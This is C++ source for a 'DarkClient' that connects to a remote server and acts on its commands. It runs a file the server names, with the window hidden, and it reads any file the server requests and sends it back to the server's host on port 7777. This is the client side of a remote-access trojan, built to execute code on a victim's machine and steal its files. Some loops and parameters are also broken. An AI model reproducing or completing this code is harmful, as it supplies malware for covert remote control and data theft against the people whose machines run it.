#include "DarkClient.h"

DarkClient::DarkClient() {
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	_client = new Client(sock);
	__hook(&Client::ConnectEvent, _client, &DarkClient::ConnectEventHandler);
}
int DarkClient::Connect(char* address, int port) {
	_client->Connect(address, port);
	return 0;
}
void DarkClient::ConnectEventHandler(Client* client) {
	_client->SendString("command");
	RoutineParams params;
	params.params = 0;
	_client->LaunchRoutine(CommandRoutine, &params);
}
void DarkClient::UploadConnectEventHandler(Client* client) {
	client->SendString("upload");
	RoutineParams params;
	params.params = 0;

	_client->LaunchRoutine(UploadRoutine, &params);
}
void DarkClient::Command(Client* owner, char* cmd) {
	if (!strcmp(cmd, "execute")) {
		Execute(owner);
		return;
	}
	if (!strcmp(cmd, "upload")) {
		Upload(owner);
		return;
	}
}
void DarkClient::Upload(Client* client) {
	SOCKET uploadSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	Client* uploadClient = new Client(uploadSocket);
	//__hook(&Client::ConnectEvent, uploadClient, &DarkClient::UploadConnectEventHandler);
	char* address = 0;
	int addressSize = 0;
	int port = 0;
	client->GetPort(&port);
	client->GetAddressStringLength(&addressSize);
	address = (char*)malloc(addressSize);
	client->GetAddress(address);
	int r = uploadClient->Connect(address, 7777);
	uploadClient->SendString("upload");
	RoutineParams* params;
	params = (RoutineParams*)malloc(sizeof(RoutineParams));
	int i = 50;
	params->params = &i;
	params->owner = uploadClient;
	uploadClient->LaunchRoutine(UploadRoutine, params);
	free(address);
}
void DarkClient::Execute(Client* client) {
	char* file = 0;
	client->ReceiveString(&file);
	ShellExecute(0, 0, file, 0, 0, 0);
	free(file);
}
DWORD DarkClient::CommandRoutine(RoutineParams* commandRoutineParams) {
	char* cmd = 0;
	while (!commandRoutineParams->owner->ReceiveString(&cmd)) {
		printf("%s \n", cmd);
		Command(commandRoutineParams->owner, cmd);
		free(cmd);
	}
	printf("End of command routine.\n");
	return 0;
}
DWORD DarkClient::UploadRoutine(RoutineParams* uploadRoutineParams) {
	char* fileName = 0;
	Client* client = uploadRoutineParams->owner;
	client->ReceiveString(&fileName);
	FILE* file = 0;
	file = fopen(fileName, "rb");
	int size = 0;
	fseek(file, 0, SEEK_END);
	size = ftell(file);
	fseek(file, 0, SEEK_SET);
	client->Send<int>(&size, 1);
	int sent = 0;
	int part = 0;
	int read = 0;
	char* buffer = (char*)malloc(BUFFER_SIZE);
	while ((read = fread(buffer, 1, BUFFER_SIZE, file)) != EOF) {
		sent = 0;
		while (sent < read) {
			part = send(client->_clientSocket, buffer+sent, read-sent, 0);
			sent += part;
		}
	}
	fclose(file);
	client->Disconnect();
	return 0;
}